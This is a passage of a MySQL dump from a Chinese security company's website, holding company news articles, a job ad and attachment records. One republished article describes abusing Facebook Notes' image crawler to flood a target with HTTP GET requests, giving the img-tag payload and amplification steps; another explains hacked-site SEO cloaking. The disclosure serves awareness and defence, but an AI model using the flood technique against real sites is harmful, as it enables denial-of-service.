本次会议旨在对三明教育系统网络安全相关负责人开展网络安全意识、等级保护安全建设能力普及培训，公司先后汇报了《三明教育系统信息安全意识培训》、《教育局数据中心等级保护培训》、《三明教育系统网站安全威胁应对》、《教育城域网集中管理解决方案》等专题内容，针对网络安全、网站安全建设与维护、教育城域网集中建设等','1493110669','1498524040','33','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('55','公司成功入选“2016年福建省科技小巨人领军企业”','','','','','','/uploads/img1/20170426/58fff1b481c95.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">近日，科技厅、省发改委、省经信委、省财政厅联合下发通知，公司凭借在网络安全技术领域的突出成就，在激烈竞争中胜出，成功入选“2016年福建省科技小巨人领军企业培育名单”。<br/></p><p style=\"text-indent: 2em;\">据悉，这是我省首次组织开展科技小巨人领军企业遴选和认定工作， “科技小巨人领军企业”是指科技创新能力强、市场占有率高、质量效益优的“隐形冠军”企业，入选“省科技小巨人领军企业”，必须具备小而优、小而强等特征，成长性好；专注主业，具有“工匠精神”，持续研发投入大，拥有关键核心技术；主要经济指标在同行业处于领先水平；管理规范、信誉良好、社会责任感强，具备良好发展前景，无不良行为记录等条件；本次遴选活动，旨在通过若干年努力，从中培育一批行业龙头企业和创新型企业，并引领我省产业转型升级。</p><p style=\"text-indent: 2em;\">作为不断追求持续创新的企业，公司在信息技术、网络安全等领域拥有核心竞争力，此次入选省科技小巨人领军企业培育名单，更是代表了公司技术和创新能力已得到多方的肯定，未来公司将全面进入发展快车道。</p><p><br/></p>','    近日，科技厅、省发改委、省经信委、省财政厅联合下发通知，公司凭借在网络安全技术领域的突出成就，在激烈竞争中胜出，成功入选“2016年福建省科技小巨人领军企业培育名单”。\r\n       据悉，这是我省首次组织开展科技小巨人领军企业遴选和认定工作， “科技小巨人领军企业”是指科技创新能力强、市场占有率高、质量效益优的“隐形冠军”企业，入选“省科技小巨人领军企业”，必须具备小而优、小而强等特征，成长性好；专注主业，具有“工匠精神”，持续研发投入大，拥有关键核心技术；主要经济指标在同行业处于领先水平；管','1493110680','1498524015','39','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('56','海峡信息公司成功承办“2016龙岩市学校网络安全管理员培训”会议','','','','','','/uploads/img1/20170426/58fff12457e4b.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">由龙岩市教育局主办、海峡信息公司承办的“2016龙岩市学校网络安全管理员培训”，于9月7日在龙岩市新罗区召开，龙岩市教育局信息中心主要领导、龙岩市网安支队、龙岩市各县区教育局信息主管、学校网络中心老师近70人参加会议。</p><p style=\"text-indent: 2em;\">本次会议旨在对龙岩教育系统网络安全相关负责人开展网络安全意识培训、等级保护安全建设培训等内容，我司资深网络安全工程师分别在培训会上作了《龙岩教育系统信息安全意识培训》、《教育系统信息安全等级保护培训》、《龙岩教育系统网站安全威胁应对措施》、《教育城域网集中管理解决方案》等报告，围绕数字化校园、教育城域网、高校数据中心等级保护建设方面分析了教育行业目前存在的网络安全问题，并提出了建设性意见，现场氛围十分活跃。</p><p style=\"text-indent: 2em;\">通过此次会议，海峡信息教育系统信息安全等级保护解决方案、教育城域网集中管理解决方案、教育局网站群安全建设方案等得到了参会人员的高度关注和认可。海峡信息认为，教育信息化目前发展相对成熟，但是网站安全、内网安全、运维安全、能否符合合规性要求是教育信息化所需面对的新问题、新挑战。作为福建省信息安全领域的领军企业，海峡信息也将继续为福建教育信息化安全保驾护航。</p>','    由龙岩市教育局主办、海峡信息公司承办的“2016龙岩市学校网络安全管理员培训”，于9月7日在龙岩市新罗区召开，龙岩市教育局信息中心主要领导、龙岩市网安支队、龙岩市各县区教育局信息主管、学校网络中心老师近70人参加会议。\r\n    本次会议旨在对龙岩教育系统网络安全相关负责人开展网络安全意识培训、等级保护安全建设培训等内容，我司资深网络安全工程师分别在培训会上作了《龙岩教育系统信息安全意识培训》、《教育系统信息安全等级保护培训》、《龙岩教育系统网站安全威胁应对措施》、《教育城域网集中管理解决方案》等','1493110692','1498523980','99','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('57','海峡信息荣获互联网经济重点公共服务平台认定','','','','','','/uploads/img1/20170426/58fff0d7ec127.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">近日，福建省发改委下发通知，为推进我省互联网经济加快发展，福建省海峡信息技术有限公司建设运营的“福建省海峡软件应用安全公共服务平台”成功入选2016年福建省互联网经济重点公共服务平台，成为省财政扶持建设项目中信息网络空间安全方向的唯一重点资质对象。建成后的“福建省海峡软件应用安全公共服务平台”将面向福建省内政企用户、系统集成商以及应用软件开发商提供黑客攻击模拟、在线网络攻击监测预警、软件安全开发测试等服务，解决软件产品普遍存在的自身安全问题，有效促进福建省软件产业的健康发展。</p><p style=\"text-indent: 2em;\">近年来，海峡信息在网络安全技术研发、市场开拓、安全服务方面不断夯实基础，厚积薄发，先后通过国家信息安全测评中心的安全服务二级资质、公安部等级保护建设服务单位、省网安办应急支撑单位等资质等网络安全行业重要认证；今后，海峡信息将以本次获得省发改委的平台认定为契机，在发挥传统安全厂商的技术积累优势基础上，坚定不移地向互联网安全转型，采用双轮驱动的方式，为我省高速发展的软件产业保驾护航，做互联网时代的安全弄潮儿。&nbsp;</p><p style=\"text-indent: 2em;\">附：福建省发展和改革委员会关于认定2016年福建省互联网经济重点公共服务平台的通知</p><p style=\"text-indent: 2em;\">http://www.fjdpc.gov.cn/show.aspx?Id=112062</p><p><br/></p><p><br/></p><p><br/></p>','    近日，福建省发改委下发通知，为推进我省互联网经济加快发展，福建省海峡信息技术有限公司建设运营的“福建省海峡软件应用安全公共服务平台”成功入选2016年福建省互联网经济重点公共服务平台，成为省财政扶持建设项目中信息网络空间安全方向的唯一重点资质对象。建成后的“福建省海峡软件应用安全公共服务平台”将面向福建省内政企用户、系统集成商以及应用软件开发商提供黑客攻击模拟、在线网络攻击监测预警、软件安全开发测试等服务，解决软件产品普遍存在的自身安全问题，有效促进福建省软件产业的健康发展。\r\n      近年来','1493110702','1498523940','124','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('58','2016年‘黑盾杯’福建省大学生网络与信息安全竞赛圆满结束','','','','','','/uploads/img1/20170426/58fff064e24da.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">11月27日，由福建省网络与信息安全协调小组办公室、福建省信息协会、福建省计算机学会主办，福建省海峡信息技术有限公司承办的”2016年‘黑盾杯’福建省大学生网络与信息安全竞赛“在福建师范大学旗山校区圆满落下帷幕，本次竞赛吸引了全省20多所高校60支代表队参赛，来自福建信息职业技术学院的Umask代表队脱颖而出，以1150分夺得本次大赛冠军。</p><p style=\"text-indent: 2em;\">本次竞赛赛题设计方面，结合了国内外众多CTF大赛的知识面以及海峡信息公司多年的攻防技术实践经验，充分地考验了选手们的网络攻防实战能力。本次竞赛采取综合网络靶场模式，综合靶场模式由外网靶机服务器和内网靶机服务器组成，每层网络均提供三个带有不同漏洞的靶场，每台靶机中可能存在一个或多个FLAG（小旗帜），提交正确的FLAG值即可得分。综合靶场模式更加贴合企业业务系统架构，参赛队伍可以通过多条路径进行整个业务系统渗透攻击，可在一定意义上较为准确的评估比赛选手的综合水平，是国内目前一种新的CTF比赛模式。</p><p style=\"text-indent: 2em;\">本次竞赛前后共持续6小时，在比赛期间选手们因大赛任务和题目的要求，不能使用通讯工具，休息、吃饭时间都计算在竞赛时间内。在比赛过程中，各代表队在虚拟赛场进行了激烈拼杀，火爆程度堪比星际战争。赛况跌宕起伏，场外教师们时时关注大屏中的赛况。</p><p style=\"text-indent: 2em;\">“黑盾杯”运用了“以赛代练”的形式，充分地激发了在校大学生的网络与信息安全学习兴趣和钻研意识，提高学生们在网络与信息安全实践能力和动手能力，同时，为在校大学生提供了一个才华展现的良好舞台，更为企业单位、事业单位挖掘、引导了一批专业的优秀人才，极大地推动了信息与网络安全行业进一步发展。</p><p>&nbsp;</p><p><br/></p><p><br/></p>','    11月27日，由福建省网络与信息安全协调小组办公室、福建省信息协会、福建省计算机学会主办，福建省海峡信息技术有限公司承办的”2016年‘黑盾杯’福建省大学生网络与信息安全竞赛“在福建师范大学旗山校区圆满落下帷幕，本次竞赛吸引了全省20多所高校60支代表队参赛，来自福建信息职业技术学院的Umask代表队脱颖而出，以1150分夺得本次大赛冠军。\r\n    本次竞赛赛题设计方面，结合了国内外众多CTF大赛的知识面以及海峡信息公司多年的攻防技术实践经验，充分地考验了选手们的网络攻防实战能力。本次竞赛采取综','1480435200','1498523906','158','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('60','我是如何利用Facebook DDoS攻击任意网站的','','','','','','/uploads/img1/20170426/58fff7e11effd.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">Facebook Notes 中允许用户包含&lt;img&gt;标签，一旦检测到&lt;img&gt;标签，Facebook就会用爬虫从外部服务器抓取标签中指定的图片并缓 存。正常情况下Facebook对图片只会缓存一次，但利用随机get参数可以绕过这个限制，那么该特性就可以被利用发动一场大流量的HTTP GET洪水攻击。</p><p style=\"text-indent: 2em;\">这个bug的利用步骤已经于2014年3月3号向Facebook Bug奖励计划报告了。</p><p style=\"text-indent: 2em;\">下面为大家解密我是如何做到的：</p><p style=\"text-indent: 2em;\">第一步，创建一组&lt;img&gt;标签组成的列表，列表中每一项只会被Facebook的爬虫抓取一次。</p><pre><p style=\"text-indent: 2em;\">&lt;imgsrc=http://targetname/file?r=1&gt;&lt;/img&gt;&lt;imgsrc=http://targetname/file?r=2&gt;&lt;/img&gt;...&lt;imgsrc=http://targetname/file?r=1000&gt;&lt;/img&gt;<br/></p></pre><p style=\"text-indent: 2em;\">第二步，通过m.facebook.com创建notes，其默认会将notes设置为固定长度。</p><p style=\"text-indent: 2em;\">第三步，为同一用户或不同用户创建一些notes，这样每个notes中就包含1000多个http请求。</p><p style=\"text-indent: 2em;\">第四步，同时浏览所有的notes，目标服务器就会受到因大量http get请求而产生的洪水流量攻击了。几秒之内，成千上万的get请求被发往目标服务器。而Facebook的并发服务器总数怎么也得有100+。</p><p style=\"text-indent: 2em;\">Facebook最初不承认这个Bug，因为他们误认为该bug只会导致404请求，不会对网站造成这么大的冲击。</p><p style=\"text-indent: 2em;\">交流过几封电子邮件之后，他们要求我证明该漏洞是否会产生什么大的影响。我将云中的一台虚拟机作为目标，只使用三个笔记本上的浏览器就在2－3个小时内产生了400+Mbps的出站流量。</p><p style=\"text-align:center\"><img alt=\"\" src=\"http://www.si.net.cn/Upimg/201493011534226.jpg\" width=\"690\" height=\"226\"/></p><p style=\"text-align: center;\"><br/>Facebook服务器数：127</p><p style=\"text-indent: 2em;\">当然，在实战中其造成的冲击应该比400Mbps大得多，因为我只是为了测试，限制了每个浏览器获取图像的数量。我利用该流量图给Facebook写了一个可以产生更大流量的PoC脚本。</p><p style=\"text-indent: 2em;\">4月11日，我收到Facebook的回复说：</p><p style=\"text-indent: 2em;\">感谢你的耐心，很抱歉我的回复有些晚了。我们已经讨论了该问题，与另一个团队也进行了更加深入的讨论。最后的结论是，在不会明显影响网站整体功能的情况下，我们暂时没有办法真正修复这个问题使其不被用来“攻击”小网站。<br/>遗憾的是，由于所谓的“无法修复”，该bug就不符合bug奖励计划，所以对该问题的报告也就不会有奖励。不过我得承认，你提出攻击思路很有趣，很有创造力，很明显上个月你投入大量精力研究并报告这一问题。我们对此很感激，希望可以继续向Facebook&nbsp;bug奖励计划提交任何安全问题。</p><p style=\"text-indent: 2em;\">我不知道他们为什么不修复这个问题，在image标签中支持动态链接可能引出其它问题，我不喜欢这种方式。我想，如果用户要在notes中动态生成图片，手动上传可能会更安全一点。同时我也想到一些因&lt;img&gt;标签乱用导致的其它问题：</p><p>流量放大攻击：如果图片被大尺寸的pdf文件或视频文件代替，Facebook可能会去抓取这些大尺寸文件，但用户获取不到任何东西。每个Note支持多于1000个连接，每个用户大约能创建100个左右Notes，之后就无法再创建了。而由于创建note时没有验证码，所有这些都可以自动化完成，攻击者可以轻松用多个帐户创建上百个notes，之后一次性同时浏览所有这些notes。虽然持续400Mbps的流量可能比较危险，但我仍想最后再测试一次，看其是否能对网站造成更大的影响。</p><p>这次不再使用浏览器，而是使用PoC脚本，可以达到大约900Mbps的出站流量。</p><p style=\"text-align:center\"><img alt=\"\" src=\"http://www.si.net.cn/Upimg/201493011541812.jpg\" width=\"690\" height=\"308\"/></p><p style=\"text-indent: 2em;\">我使用的是一个普通的13M大小的PDF文件，由Facebook去fetch 180000+次，涉及到112台Facebook服务器。</p><p style=\"text-indent: 2em;\">通过流量表可以看到流量几乎维持在895Mbps，可能是因为我使用的这台云虚拟机的能达到的最大流量就是这么多，该虚拟机使用的是一个共享的Gbps以太网口。看起来Facebook服务器根本没有对爬虫做严格的限制，可以想像那些服务器能产生大多的流量。</p><p style=\"text-indent: 2em;\">发现并报告了这一问题之后，我在Google上发现了类似的问题。结合Google与Facebook，我们可以轻松创造Gbps级别的GET洪水流量。</p><p>Facebook爬虫将自自己显示为facebookexternalhit。目前看起来现在也没什么其它方法来避免这种麻烦。</p><p>[更新]</p><p><a title=\"\" href=\"https://developers.facebook.com/docs/ApplicationSecurity/\" target=\"_blank\">https://developers.facebook.com/docs/ApplicationSecurity/</a>中提到一种获取属于Facebook爬虫的IP地址的方式：</p><pre>whois&nbsp;-h&nbsp;whois.radb.net&nbsp;-&nbsp;&amp;#039;-i&nbsp;origin&nbsp;AS32934&amp;#039;&nbsp;|&nbsp;grep&nbsp;^route</pre><p>直接阻断IP地址比阻断useragent可能更有效。</p><p><br/></p>','Facebook Notes 中允许用户包含&lt;img&gt;标签，一旦检测到&lt;img&gt;标签，Facebook就会用爬虫从外部服务器抓取标签中指定的图片并缓 存。正常情况下Facebook对图片只会缓存一次，但利用随机get参数可以绕过这个限制，那么该特性就可以被利用发动一场大流量的HTTP GET洪水攻击。\r\n这个bug的利用步骤已经于2014年3月3号向Facebook Bug奖励计划报告了。\r\n下面为大家解密我是如何做到的：\r\n第一步，创建一组&lt;img&gt;标签组成的列表，列','1493170126','1498524786','69','41','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('61','谈谈那些被黑的网站','','','','','','/uploads/img1/20170426/58fff8169c398.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">咱们平时最经常也最了解的被黑，应该就属于那种替换掉首页或者在网站目录上传个黑页，这种很常见，国内外均有这样黑页提交统计站点，如国内的被黑站点统计。</p><p style=\"text-indent: 2em;\">这种被黑不难理解，渗透网站，通过各种方式上传webshell，然后上传黑页就算是了，一般这种被黑的目的就是出于纯粹的黑站，有报复、宣传一些东西之类的。这次的马航事件，马航官方网站旗下edm分站就被一名为4z1的马来西亚黑客所黑，黑客留言“I&#39;m From Malaysia But I Dare Not Admit”影射马来西亚政府刻意隐瞒真相，不敢承认事实。下图就是一个常见的黑页。</p><p style=\"text-indent: 2em;\">在普通被黑之外，有三种情况，三种情况的目的是差不多的，seo。为什么这么说呢?具体如何?不告诉你。开个玩笑，看下文</p><p style=\"text-indent: 2em;\">第一种，暗链，这种被黑一般仅存在于首页。暗链不会影响页面的显示，不会破坏页面格局，更不会进行跳转，黑客通过设置使链接在页面不可见，但实际又存在，可以通过源码查看。通常方式有如设置css，使div等不可见、使div的边距为负数，反正只要在页面上看不到就行。一般位置处于源码的底部或者顶部。</p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s4.51cto.com/wyfs02/M02/22/DE/wKioL1MqRT2htBqCAAFdtQ8KQo8048.jpg\" width=\"498\" height=\"446\"/></p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s1.51cto.com/wyfs02/M01/22/DD/wKiom1MqRXvg-dTXAABWTjE5JR0281.jpg\" width=\"600\" height=\"118\"/></p><p style=\"text-indent: 2em;\">黑客为什么这样做，咱们先不说，后面一起来</p><p style=\"text-indent: 2em;\">第二种，UA作弊，我们先来看两张图</p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s1.51cto.com/wyfs02/M02/22/DD/wKiom1MqRY7TXjY0AADfrlDwFPw536.jpg\" width=\"600\" height=\"245\"/></p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s5.51cto.com/wyfs02/M00/22/DE/wKioL1MqRXLzAexJAAHNBVB5bCk893.jpg\" width=\"600\" height=\"440\"/></p><p style=\"text-indent: 2em;\">同一个网址，两种界面</p><p style=\"text-indent: 2em;\">这个绝对不是笔者闲着没事干用F12去修改了代码，而是笔者对火狐的一个设置改变了下，真相在下图</p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s8.51cto.com/wyfs02/M02/22/DD/wKiom1MqRavRxaRjAACcb73EL8Y447.jpg\" width=\"600\" height=\"231\"/></p><p style=\"text-indent: 2em;\">其实有些读者在看到标题应该就知道情况了，就是UA起的作用，把UA改成搜索引擎爬虫的UA，查看到的就是另一个页面了</p><p style=\"text-indent: 2em;\">具体设置:general.useragent.override:Googlebot/2.1</p><p style=\"text-indent: 2em;\">第三种，REFERER作弊，同样先来看看图</p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s7.51cto.com/wyfs02/M01/22/DE/wKioL1MqRZbB59qlAADGHiDkauo408.jpg\" width=\"600\" height=\"302\"/></p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s4.51cto.com/wyfs02/M02/22/DE/wKioL1MqRdLjOXs6AAFj-ZQvsZA702.jpg\" width=\"600\" height=\"248\"/></p><p>&nbsp;&nbsp;</p><p style=\"text-indent: 2em;\">这其实访问的是同一个网址，结果第二次访问跳转到一个博彩网站，第一次访问是原页面</p><p style=\"text-indent: 2em;\">秘密在这</p><p style=\"text-align:center\"><img alt=\"谈谈那些被黑的网站\" src=\"http://s4.51cto.com/wyfs02/M01/22/DD/wKiom1MqRgqQA2U5AAC4934a3JA639.jpg\" width=\"498\" height=\"280\"/></p><p style=\"text-indent: 2em;\">因为第二个页面是我通过搜索引擎搜索直接点击搜索结果跳转过去访问的，因为带了来自搜索引擎的referer，页面就自动跳转了</p><p style=\"text-indent: 2em;\">好，看完了各种被黑，我先来看看每种的定义：</p><p style=\"text-indent: 2em;\">暗链：其实“暗链”就是看不见的网站链接，“暗链”在网站中的链接做的非常隐蔽，短时间内不易被搜索引擎察觉。它和友情链接有相似之处，可以有效地提高PR值。但要注意一点PR值是对单独页面，而不是整个网站。</p><p style=\"text-indent: 2em;\">UA作弊：又叫Cloaked Page。Cloaking中文翻译：伪装，隐蔽的。延伸意思：遮蔽或转移别人视线使其看不清真相的手法。</p><p style=\"text-indent: 2em;\">通常是说在Web服务器上使用一定的手段，对搜索引擎中的巡回机器人显示出与普通阅览者不同内容的网页。</p><p style=\"text-indent: 2em;\">REFERER作弊：又叫欺骗性重定向(Deceptive redirects)。</p><p style=\"text-indent: 2em;\">指把用户访问的第一个页面(着陆页)迅速重定向至一个内容完全不同的页面。</p><p style=\"text-indent: 2em;\">做这些又为了什么呢?其实大部分都是为了SEO。</p><p style=\"text-indent: 2em;\">这些其实都是SEO作弊，其实就是黑帽SEO。做SEO的应该很了解这些方式。</p><p style=\"text-indent: 2em;\">黑帽SEO的方法很多，我们只谈与被黑相关的。而相关中，根据笔者长期进行恶意网站数据工作的经验，又以这三者最多。实现的前提同样是对网站的渗透。</p><p style=\"text-indent: 2em;\">在写这篇文章之前，笔者就又收到过这样的合作，听介绍，很诱惑，只要通过site:url方式在搜索引擎能搜索到的页面，如果黑下来，能够上传webshell，就可以卖给相关的人，相关的人会上传已准备好的页面，第一次卖，可以获得一定金钱，只要构造的页面存在，存在一天，每天都给钱。听着很诱人，笔者也没去证实是否真假。</p><p><br/></p>','我们已经看惯了的被黑\r\n咱们平时最经常也最了解的被黑，应该就属于那种替换掉首页或者在网站目录上传个黑页，这种很常见，国内外均有这样黑页提交统计站点，如国内的被黑站点统计。\r\n这种被黑不难理解，渗透网站，通过各种方式上传webshell，然后上传黑页就算是了，一般这种被黑的目的就是出于纯粹的黑站，有报复、宣传一些东西之类的。这次的马航事件，马航官方网站旗下edm分站就被一名为4z1的马来西亚黑客所黑，黑客留言“I\'m From Malaysia But I Dare Not Admit”影射马来西亚政府刻意','1493170170','1499049671','94','41','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('68','WEB开发人员','','','','','','','<p><strong style=\"white-space: normal;\"><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;岗位职责</strong><br/></p><p>熟练使用PS等制图软件</p><p>主要负责网站的静态页面制作</p><p>能熟练使用DIV+CSS技术设计静态页面</p><p>会javascipt优先</p><p>学习能力强，沟通、表达能力好，有团队合作精神，有责任感，有创新思维</p><p>发送简历请同时发送相关设计作品</p><p><strong style=\"white-space: normal;\"></strong></p><p style=\"white-space: normal;\"><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;</strong><strong>联系方式</strong>&nbsp;</p><p style=\"white-space: normal;\">联系地址：福州市北环中路61号海峡信息大楼2F</p><p style=\"white-space: normal;\">联系电话：0591-87303710</p><p style=\"white-space: normal;\">联 系 人：张先生</p><p style=\"white-space: normal;\">电子邮箱：hxzhb@heidun.net</p><p><br/></p>',' 岗位职责熟练使用PS等制图软件主要负责网站的静态页面制作能熟练使用DIV+CSS技术设计静态页面会javascipt优先学习能力强，沟通、表达能力好，有团队合作精神，有责任感，有创新思维发送简历请同时发送相关设计作品 ','1498890485','1498891575','75','99','1','0','','0','0','1');
INSERT INTO `xyh_article` VALUES ('69','海峡信息精彩亮相第十五届中国海峡项目成果交易会','','','','','','/uploads/img1/20170702/5958b49584170.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">6月18日，第十五届中国•海峡项目成果交易会（简称6•18）在福州国际会展中心隆重开幕。作为福建本土技术领先的信息安全整体解决方案提供商，海峡信息以“黑盾--安全缔造信息未来 ”为主题，携互联网应用安全态势感知系统、数据库安全治理平台、十万兆级高性能安全网关、基于国产CPU芯片组的安全设备等四款创新产品闪耀亮相数字经济馆，为到场嘉宾呈现了多元化的安全应用解决方案。<br/></p><p style=\"text-indent: 2em;\">未来，作为福建省信息安全领域的领军企业，海峡信息将借助福建独特的区位优势，持续创新，砥砺前行，继续为中国的网络安全事业添砖加瓦。</p>','  6月18日，第十五届中国•海峡项目成果交易会（简称6•18）在福州国际会展中心隆重开幕。作为福建本土技术领先的信息安全整体解决方案提供商，海峡信息以“黑盾--安全缔造信息未来 ”为主题，携互联网应用安全态势感知系统、数据库安全','1498985467','1498985662','93','18','1','1','','0','0','1');


# 转存表中的数据：xyh_attachment 
INSERT INTO `xyh_attachment` VALUES ('50','introduce01.png','img1/20170425/58fef17a4bf0c.png','1','29955','1','1493102970','1','0');
INSERT INTO `xyh_attachment` VALUES ('2','100fw.jpg','img1/20170418/58f5c1732e136.jpg','1','12127','1','1492500851','1','0');
INSERT INTO `xyh_attachment` VALUES ('3','1000fw.jpg','img1/20170418/58f5c271aaec5.jpg','1','13128','1','1492501105','1','0');
INSERT INTO `xyh_attachment` VALUES ('4','100ids.jpg','img1/20170418/58f5cded4a97b.jpg','1','24017','1','1492504045','1','0');
INSERT INTO `xyh_attachment` VALUES ('5','黑盾安全审计系统.jpg','img1/20170418/58f5d06f80f25.jpg','1','80404','1','1492504687','1','0');
INSERT INTO `xyh_attachment` VALUES ('6','高新技术企业061025.jpg','img1/20170419/58f6c9a14437a.jpg','1','166197','1','1492568481','1','0');
INSERT INTO `xyh_attachment` VALUES ('7','高新技术企业认定证书061025.jpg','img1/20170419/58f6c9a39cd4b.jpg','1','167752','1','1492568483','1','0');
INSERT INTO `xyh_attachment` VALUES ('8','高新技术企业认定证书061025.jpg','img1/20170419/58f6cb7855f43.jpg','1','167752','1','1492568952','1','0');
INSERT INTO `xyh_attachment` VALUES ('9','高新技术企业061025.jpg','img1/20170419/58f6cb7a4dc40.jpg','1','166197','1','1492568954','1','0');
INSERT INTO `xyh_attachment` VALUES ('10','高新技术企业061025.jpg','img1/20170419/58f6d642abf1d.jpg','1','166197','1','1492571714','1','0');
INSERT INTO `xyh_attachment` VALUES ('11','高新技术企业认定证书061025.jpg','img1/20170419/58f6d6450587c.jpg','1','167752','1','1492571717','1','0');
INSERT INTO `xyh_attachment` VALUES ('12','信息安全服务资质2.jpg','img1/20170419/58f6d66ad5ac9.jpg','1','186476','1','1492571755','1','0');
INSERT INTO `xyh_attachment` VALUES ('13','fw3.5版权证书.jpg','img1/20170419/58f6d677cadae.jpg','1','256241','1','1492571768','1','0');
INSERT INTO `xyh_attachment` VALUES ('14','vpn软件产品登记.jpg','img1/20170419/58f6d6cd3581f.jpg','1','185794','1','1492571853','1','0');
INSERT INTO `xyh_attachment` VALUES ('15','100fw.jpg','img1/20170419/58f6d72e2bb65.jpg','1','12127','1','1492571950','1','0');
INSERT INTO `xyh_attachment` VALUES ('16','1000fw.jpg','img1/20170419/58f6d90f8e02f.jpg','1','13128','1','1492572431','1','0');
INSERT INTO `xyh_attachment` VALUES ('17','201612051610021.jpg','img1/20170419/58f70475a9b80.jpg','1','35862','1','1492583541','1','0');
INSERT INTO `xyh_attachment` VALUES ('18','201493011958801.jpg','img1/20170419/58f70969a1416.jpg','1','171235','1','1492584809','1','0');
INSERT INTO `xyh_attachment` VALUES ('19','product_sms.gif','img1/20170419/58f71774a949f.gif','1','12741','1','1492588405','1','0');
INSERT INTO `xyh_attachment` VALUES ('20','2016-12-0201.jpg','img1/20170421/58f96f5cb8a0b.jpg','1','36039','1','1492741980','1','0');
INSERT INTO `xyh_attachment` VALUES ('21','timg.jpg','img1/20170421/58f96fa39dc91.jpg','1','25897','1','1492742051','1','0');
INSERT INTO `xyh_attachment` VALUES ('22','timg (1).jpg','img1/20170421/58f9700d9d499.jpg','1','30983','1','1492742157','1','0');
INSERT INTO `xyh_attachment` VALUES ('23','timg (2).jpg','img1/20170421/58f970554c9c0.jpg','1','56886','1','1492742229','1','0');
INSERT INTO `xyh_attachment` VALUES ('24','timg (3).jpg','img1/20170421/58f970a80e086.jpg','1','31446','1','1492742312','1','0');
INSERT INTO `xyh_attachment` VALUES ('25','黑盾杯.jpg','img1/20170421/58f9b87976bcb.jpg','1','35862','1','1492760697','1','0');
INSERT INTO `xyh_attachment` VALUES ('26','互联网经济重点公共服务平台.jpg','img1/20170421/58f9b8d344a8b.jpg','1','25897','1','1492760787','1','0');
INSERT INTO `xyh_attachment` VALUES ('27','互联网经济促进会.jpg','img1/20170421/58f9b938d47de.jpg','1','24150','1','1492760888','1','0');
INSERT INTO `xyh_attachment` VALUES ('28','龙岩市学校网络安全管理员培训.jpg','img1/20170421/58f9b9645e310.jpg','1','51921','1','1492760932','1','0');
INSERT INTO `xyh_attachment` VALUES ('29','科技小巨人领军企业.jpg','img1/20170421/58f9b9a19741f.jpg','1','20838','1','1492760993','1','0');
INSERT INTO `xyh_attachment` VALUES ('30','高新技术企业认定证书061025.jpg','img1/20170421/58f9ba2cc5c38.jpg','1','167752','1','1492761133','1','0');
INSERT INTO `xyh_attachment` VALUES ('31','高新技术企业061025.jpg','img1/20170421/58f9ba3011d1e.jpg','1','166197','1','1492761136','1','0');
INSERT INTO `xyh_attachment` VALUES ('32','信息安全服务资质2.jpg','img1/20170421/58f9ba636ec73.jpg','1','186476','1','1492761187','1','0');
INSERT INTO `xyh_attachment` VALUES ('33','antidos2.0版权证书.jpg','img1/20170421/58f9baabca5e1.jpg','1','327263','1','1492761260','1','0');
INSERT INTO `xyh_attachment` VALUES ('34','fw3.5版权证书.jpg','img1/20170421/58f9baad65c93.jpg','1','256241','1','1492761261','1','0');
INSERT INTO `xyh_attachment` VALUES ('35','fw软件产品登记.jpg','img1/20170421/58f9baaf323dc.jpg','1','90886','1','1492761263','1','0');
INSERT INTO `xyh_attachment` VALUES ('36','ids软件产品登记.jpg','img1/20170421/58f9bab08b97f.jpg','1','87190','1','1492761264','1','0');
INSERT INTO `xyh_attachment` VALUES ('37','vpn软件产品登记.jpg','img1/20170421/58f9bab215cf5.jpg','1','185794','1','1492761266','1','0');
INSERT INTO `xyh_attachment` VALUES ('38','hd-sms软件著作权.jpg','img1/20170421/58f9bb10b0aa7.jpg','1','89419','1','1492761360','1','0');
INSERT INTO `xyh_attachment` VALUES ('39','ids3.1版权证书.jpg','img1/20170421/58f9bb125c2e2.jpg','1','88309','1','1492761362','1','0');
INSERT INTO `xyh_attachment` VALUES ('40','IDS销售许可证.jpg','img1/20170421/58f9bb1401bf2.jpg','1','79550','1','1492761364','1','0');
INSERT INTO `xyh_attachment` VALUES ('41','vpn2.5版权证书.jpg','img1/20170421/58f9bb154c20e.jpg','1','338089','1','1492761365','1','0');
INSERT INTO `xyh_attachment` VALUES ('42','1000fw.jpg','img1/20170421/58f9bb7c8eed4.jpg','1','13128','1','1492761468','1','0');
INSERT INTO `xyh_attachment` VALUES ('43','100fw.jpg','img1/20170421/58f9bb876671c.jpg','1','12127','1','1492761479','1','0');
INSERT INTO `xyh_attachment` VALUES ('44','10000fw.jpg','img1/20170421/58f9bbbc7f191.jpg','1','22852','1','1492761532','1','0');
INSERT INTO `xyh_attachment` VALUES ('45','100ids.jpg','img1/20170421/58f9bbdd23261.jpg','1','24017','1','1492761565','1','0');
INSERT INTO `xyh_attachment` VALUES ('46','201493011958801.jpg','img1/20170421/58f9bf47c1e6d.jpg','1','171235','1','1492762439','1','0');
INSERT INTO `xyh_attachment` VALUES ('47','201493011823173.jpg','img1/20170421/58f9bf954081d.jpg','1','61337','1','1492762517','1','0');
